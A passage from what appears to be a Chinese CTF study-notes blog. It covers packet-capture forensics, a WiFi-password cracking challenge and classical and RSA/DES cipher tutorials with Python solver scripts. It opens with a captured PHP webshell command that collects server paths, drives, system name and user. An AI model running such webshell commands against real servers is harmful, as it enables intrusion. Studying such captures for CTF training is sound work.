class="line">@set_time_limit(0);</span><br><span class="line">  </span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">  </span><br><span class="line">echo(“-&gt;|”);;</span><br><span class="line">  </span><br><span class="line">$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">  </span><br><span class="line">if($D==”&quot;)</span><br><span class="line">  </span><br><span class="line">    $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">  </span><br><span class="line">$R=”&#123;$D&#125;\t”;</span><br><span class="line">  </span><br><span class="line">if(substr($D,0,1)!=”/”)</span><br><span class="line">  </span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">    foreach(range(“A”,”Z”) as $L)</span><br><span class="line">  </span><br><span class="line">        if(is_dir(“&#123;$L&#125;:”))</span><br><span class="line">  </span><br><span class="line">            $R.=”&#123;$L&#125;:”;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">$R.=”\t”;</span><br><span class="line">  </span><br><span class="line">$u=(function_exists(‘posix_getegid’))?@posix_getpwuid(@posix_geteuid()):”;</span><br><span class="line">  </span><br><span class="line">$usr=($u)?$u[&apos;name&apos;]:@get_current_user();</span><br><span class="line">  </span><br><span class="line">$R.=php_uname();</span><br><span class="line">  </span><br><span class="line">$R.=”(&#123;$usr&#125;)”;</span><br><span class="line">  </span><br><span class="line">print $R;;</span><br><span class="line">  </span><br><span class="line">echo(“|&lt;-”);</span><br><span class="line">  </span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>  在tcp stream 5发现一个压缩包，下载</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p>  在tcp stream 6发现png文件头89504E47</p><p>  保存为一张png图片</p><ul><li><p>question</p><p>破解wifi密码（文件wifi.cap）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;你破解的WiFi密码&#125;</span><br><span class="line"></span><br><span class="line">tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你</span><br><span class="line">1391040**</span><br><span class="line">Goodluck!!</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080608.png" alt=""></p></li></ul><p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080609.png" alt=""></p><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><hr><p><a href="https://blog.csdn.net/qq_41187256/article/details/79693012" target="_blank" rel="noopener">https://blog.csdn.net/qq_41187256/article/details/79693012</a></p><ul><li><p>栅栏密码</p><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话</p><p>明文：THERE IS A CIPHER<br>去掉空格后变为：THEREISACIPHER<br>两个一组，得到：TH ER EI SA CI PH ER<br>先取出第一个字母：TEESCPE<br> 再取出第二个字母：HRIAIHR<br>连在一起就是：TEESCPEHRIAIHR<br>还原为所需密码。<br>而解密的时候，我们先把密文从中间分开，变为两行：<br>T E E S C P E<br>H R I A I H R<br>再按上下上下的顺序组合起来：<br>THEREISACIPHER<br>分出空格，就可以得到原文了：<br>THERE IS A CIPHER</p></li><li><p>Brainfuck/Ook!编码</p></li><li><p><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">https://tool.bugku.com/brainfuck/</a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure><ul><li><p>培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：<br>第一种方式：<br>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab<br>K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb Y bbaaa Z bbaab<br>第二种方式<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA</p><p>f AABAB m ABABB s BAAAB z BABBB</p></li></ul><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baabbaabaabaaaababbaaabbaabbababbabaaabb</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/xuqi7/article/details/52261291" target="_blank" rel="noopener">脚本工具</a></p><ul><li><p>caesar（凯撒）</p><p>使用python pycipher库</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080610.png" alt=""></p></li></ul><ul><li><p>RSA算法(非对称密码)</p><p>加密过程  选择两个大素数p和q，计算出模数N = p * q </p><p>计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质</p><p> 取e的模反数为d，计算方法: e * d ≡ 1 (mod φ) </p><p>对明文m进行加密：c≡m^e (mod n) 或 c = pow(m,e,n)，得到的B即为密文 </p><p>对密文c进行解密，m≡c^d( mod n) 或 m = pow(c,d,n)，得到的A即为明文</p><p> p 和 q ：大整数N的两个因子（factor）</p><p> N：大整数N，我们称之为模数（modulus）</p><p> e 和 d：互为模反数的两个指数（exponent）</p><p> c 和 m：分别是密文和明文，这里一般指的是一个十进制的数</p><p>一般有如下称呼：</p><p>（N，e）：公钥</p><p>（N，d）：私钥</p><p>分解N可以在线factordb.com</p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_n</span><span class="params">(n)</span>:</span>   <span class="comment">#分解n</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = int(n/i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">n=<span class="number">2135733555619387051</span></span><br><span class="line">c=<span class="number">781391873123526159</span></span><br><span class="line">p,q=split_n(n)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">'c:%d'</span>%c)</span><br><span class="line">print(<span class="string">"p = "</span> + str(p))</span><br><span class="line">print(<span class="string">"q = "</span> + str(q))</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line">m=pow(c,d,n)   <span class="comment">#快速幂取模</span></span><br><span class="line">print(<span class="string">'m = '</span>+str(m))</span><br></pre></td></tr></table></figure></li></ul><p><strong>常见题型的分类</strong></p><p><strong>（1）已知p、q、e求解d</strong></p><p><strong>解题思路：</strong>根据 φ = (p−1) <em> (q−1)这一欧拉函数式， 可以使用所给的p、q求解出n的欧拉函数值φ,之后再根据       e </em> d ≡ 1 (mod φ) 即可求解出d的值。</p><p>题目</p><p><a href="http://www.shiyanbar.com/ctf/1828" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1828</a></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p=<span class="number">473398607161</span></span><br><span class="line">    q=<span class="number">4511491</span></span><br><span class="line">    e=<span class="number">17</span></span><br><span class="line">    f_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    d=modinv(e,f_n)</span><br><span class="line">    print(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>已知p、q、e、c求解明文</strong></p><p><strong>思路：</strong>根据<strong>n=p*q</strong>求解出n的值，之后再根据<strong>φ = (p−1) * (q−1)</strong>，求解出n的欧拉函数的值，之后再根据<strong>e * d ≡ 1 (mod φ)</strong>求解出d的值，之后再根据<strong>m≡c^d( mod n) 或 m = pow(c,d,n)</strong>求解出明文信息即可！</p><p>题目</p><p><a href="http://www.shiyanbar.com/ctf/1979" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1979</a></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q=<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c=<span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">f_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">'c:%d'</span>%c)</span><br><span class="line"></span><br><span class="line">d=modinv(e,f_n)</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(<span class="string">"------------"</span>)</span><br><span class="line">print(<span class="string">'message:%d'</span>%m)</span><br></pre></td></tr></table></figure><p>题目</p><p><a href="http://ctf5.shiyanbar.com/crypto/RSAROLL.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/crypto/RSAROLL.txt</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_n</span><span class="params">(n)</span>:</span>   <span class="comment">#分解n</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = int(n/i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line">p,q=split_n(n)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">"p = "</span> + str(p))</span><br><span class="line">print(<span class="string">"q = "</span> + str(q))</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'rsa.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> f:</span><br><span class="line">        res+=chr(pow(int(c.replace(<span class="string">'\n'</span>,<span class="string">''</span>)),d,n))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><ul><li><p>DES（对称算法）</p><p><a href="https://blog.csdn.net/qq_42606051/article/details/81279504" target="_blank" rel="noopener">https://blog.csdn.net/qq_42606051/article/details/81279504</a></p><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：74cWby3JysahM3cZudF3gT11lamL/4Cd</span><br><span class="line">key=12345678</span><br><span class="line">求明文</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'12345678'</span></span><br><span class="line"></span><br><span class="line">des = DES.new(key,DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">encrypted_text=base64.b64decode(<span class="string">'74cWby3JysahM3cZudF3gT11lamL/4Cd'</span>)</span><br><span class="line"></span><br><span class="line">decrypted_text = des.decrypt(encrypted_text)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"明文:"</span>+decrypted_text</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080611.png" alt=""></p></li></ul><ul><li><a href="https://blog.csdn.net/iteye_6478/article/details/82165923" target="_blank" rel="noopener">https://blog.csdn.net/iteye_6478/article/details/82165923</a></li></ul><ul><li><p>拓展</p><p>与佛论禅</p><ul><li><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怯勝苦集參哆究梵礙呐度究梵呼梵顛以怯勝豆哆陀哆真罰夜大知涅曳他呐依道多波缽喝侄波缽羅奢喝俱咒冥上奢阿怯喝侄羅以侄朋僧哆婆謹冥地諳顛哆度哆都冥寫有呐阿勝娑哆涅皤怛。怯苦怯南是哆得謹侄訶至故殿故僧道多地罰倒皤利奢喝呐南奢都哆。切是奢究奢藝侄參哆佛曰明諳道彌奢娑阿哆寫娑利梵姪若諦竟奢藐悉奢集諳彌諳遮怯。皤喝阿孕怯曰罰般梵多伊梵耨死哆彌阿輸呐遮冥上哆藐夷冥輸俱故沙恐冥薩侄栗世得。耨夢諳智都冥薩耨俱薩皤密吉怖罰想上罰喝訶罰蒙盧舍神藝哆知呐姪怯那楞皤度遮奢顛度梵咒呐訶悉梵利究即冥夢諳一俱娑怯沙俱三奢婆缽知侄無呐若槃醯想哆故冥怖沙諳一豆曳呐咒心羯有</span><br></pre></td></tr></table></figure></li><li><p>解密前要带上<code>佛曰：</code>或<code>如是我闻：</code>的文字。</p></li></ul></li></ul><ul><li><p>aaencode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure><ul><li>解密网站  <a href="https://www.qtool.net/decode" target="_blank" rel="noopener">https://www.qtool.net/decode</a></li></ul></li></ul><ul><li><p>jsfuck</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 